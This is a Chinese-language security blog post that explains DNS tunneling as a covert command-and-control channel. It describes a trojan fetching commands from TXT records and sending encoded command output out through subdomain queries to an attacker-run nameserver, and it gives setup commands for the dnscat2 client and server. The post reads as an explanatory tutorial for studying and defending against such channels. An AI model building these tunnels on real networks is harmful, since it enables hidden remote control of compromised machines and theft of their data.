<!DOCTYPE html>
<html lang=""><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>Intranet Space - Dns Tunneling</title>
    <meta name="description" content="倾旋的博客">
    <meta name="author" content='倾旋'>

    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">

    
    <link rel="stylesheet" href="/sass/researcher.min.css">

    
        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
    

    
        
    
</head>

    <body><div class="container mt-5">
    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
          
          倾旋的博客
        </a>
        <div class="navbar-nav flex-row flex-wrap justify-content-center">
            
                
                
                    <a class="nav-item nav-link" href="/about" title="About">
                        About
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/projects/" title="Projects">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-terminal-fill" viewBox="0 0 16 16"><path d="M0 3a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3zm9.5 5.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 0-1zm-6.354-.354a.5.5 0 1 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708L4.793 6.5 3.146 8.146z"/></svg> Projects
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/links/" title="Links">
                        Links
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/post/" title="Posts">
                        Posts
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
                        Rss
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/tools/" title="Tools">
                        Tools
                    </a>
                    
                
            
        </div>
    </nav>
</div>
<hr>
<div id="content">
<div class="container">
    <h2 id="0x00-dns隧道简介">0x00 DNS隧道简介</h2>
<p>DNS Tunneling，是隐蔽信道的一种，通过将其他协议的数据封装在DNS协议中传输建立通信。</p>
<p>普通的 DNS 查询过程如下:</p>
<p>客户端发送 DNS 请求-&gt;DNS 服务器-&gt;如果 DNS 服务器寻找不到该记录-&gt;继续递归查询-&gt;寻找该域名 的 NS 记录-&gt;询问 NS 记录指向的 DNS 服务器-&gt;DNS 服务器响应-&gt;传输给客户端。</p>
<p>本次通过设置一个 NS 服务器，实现了 DNS 隧道的建立，使得服务器可向客户端发送任意命令，并且回 传命令执行的结果。
DNS 隧道是隐蔽的、可加密的数据传输隧道，基于 UDP 协议，目的端口号为 53。</p>
<p>它的缺点就是不稳定、 传输过大文件时容易失去连接，需要重新建立。</p>
<h2 id="0x01-dns隧道原理">0x01 DNS隧道原理</h2>
<p>DNS 隧道简单例子:</p>
<table>
<thead>
<tr>
<th>类型</th>
<th style="text-align:center">主机记录</th>
<th style="text-align:right">记录值</th>
</tr>
</thead>
<tbody>
<tr>
<td>NS</td>
<td style="text-align:center">HACK</td>
<td style="text-align:right">NS.XXX.COM</td>
</tr>
<tr>
<td>A</td>
<td style="text-align:center">NS</td>
<td style="text-align:right">XXX.XXX.XXX.XXX</td>
</tr>
</tbody>
</table>
<p>首先在 DNS 解析管理平台上设置一个 NS 和一个 A 记录:</p>
<p>当我们询问 hello.HACK.XXX.COM 时，DNS 客户端发送的查询请求会递归到主机记录 NS 指向的 XXX.XXX.XXX.XXX 服务器上。
黑客通过在 XXX.XXX.XXX.XXX 服务器上监听 53 端口，即可获得 DNS 客户端发送来的请求。</p>
<h2 id="0x02-如何获得命令执行结果">0x02 如何获得命令执行结果?</h2>
<p>这里需要木马的配合，黑客会在服务器端的程序上专门设置一个 TXT 的主机记录，用于存放命令。</p>
<p>木马会不断请求 COMMAND.HACK.XXX.COM，获得 TXT 的解析结果，并执行，然后将结果进行分段加密传送至 DNS 服务器，构造一个 A 记录的查询请求。</p>
<p>例如服务端:<code>set command=ipcofig</code></p>
<p>客户端:请求 <code>COMMAND.HACK.XXX.COM</code>，得到解析结果ipconfig</p>
<p>操作系统执行后，返回结果一般如下:</p>
<pre><code>WINDOWS IP Configuration:
......
</code></pre><p>此时木马将 WINDOWS IP Configuration 进行编码加密，可能是如下形式:</p>
<pre><code>U2FsdGVkX19cMV2s858WNyKHm5mRXx4VXng1nK8bFG5XKQSaO52vXKIsX0IZ1pxyCdI
</code></pre><p>然后拼接成域名为:</p>
<pre><code>U2FsdGVkX19cMV2s858WNyKHm5mRXx4VXng1nK8bFG5XKQSaO52vXKIsX0IZ1pxyCdI.H ACK.XXX.COM
</code></pre><p>服务端接收后，会使用密钥解密这串字符，得到命令执行结果。</p>
<p>这样反复的过程就能达到永久控制客户端的目的。</p>
<h2 id="0x03-如何判断是否能够建立隧道">0x03 如何判断是否能够建立隧道?</h2>
<p>使用 nslookup 工具查询 DNS 解析记录。</p>
<p>命令:</p>
<ul>
<li><code>nslookup @114.114.114.114 baidu.com</code></li>
<li><code>nslookup @8.8.8.8 baidu.com</code></li>
<li><code>nslookup @内网DNS Server baidu.com</code></li>
</ul>
<p>如果均能查询到 A 记录后，再换一些不常见域名，例如:translate.google.cn</p>
<p>若还是能够解析，则可以构建 DNS 隧道。</p>
<h2 id="0x04-dnscat2">0x04 dnscat2</h2>
<p>This tool is designed to create an encrypted command-and-control (C&amp;C) channel over the DNS protocol, which is an effective tunnel out of almost every network.</p>
<blockquote>
<p><strong>dnscat2分为客户端和服务端</strong></p>
</blockquote>
<p>客户端配置：</p>
<pre><code>$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/client/
$ make
$ dnscat &lt;Domain&gt;
</code></pre><p>服务端配置（需要Ruby环境）：</p>
<pre><code>$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/server/
$ gem install bundler
$ bundle install
$ ./dnscat2 --dns server=x.x.x.x,port=53
</code></pre><p>这一切的前提是按照0x01中的环境配置好后再操作。</p>
<p>DNS配置：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th style="text-align:center">主机记录</th>
<th style="text-align:right">记录值</th>
</tr>
</thead>
<tbody>
<tr>
<td>NS</td>
<td style="text-align:center">dns</td>
<td style="text-align:right">ns.payloads.online</td>
</tr>
<tr>
<td>A</td>
<td style="text-align:center">ns</td>
<td style="text-align:right">1.1.1.1</td>
</tr>
</tbody>
</table>
<pre><code># 服务器(1.1.1.1)
root@payloads:~# tcpdump udp port 53
</code></pre><pre><code># 客户端
nslookup hello.dns.payloads.online
</code></pre>
</div>

        </div><div id="footer" class="mb-5">
    <hr>
    <div class="container text-center">
        
            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
        
            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
        
    </div>
    
        <div class="container text-center">
            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
        </div>
    
</div>



<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
<script>
(function(){
  let plantumlPrefix = "language-plantuml";
  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
    let image = document.createElement("IMG");
    image.loading = 'lazy'; 
    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
    code.parentNode.insertBefore(image, code);
    code.style.display = 'none';
  });
})();
</script>

</body>
</html>
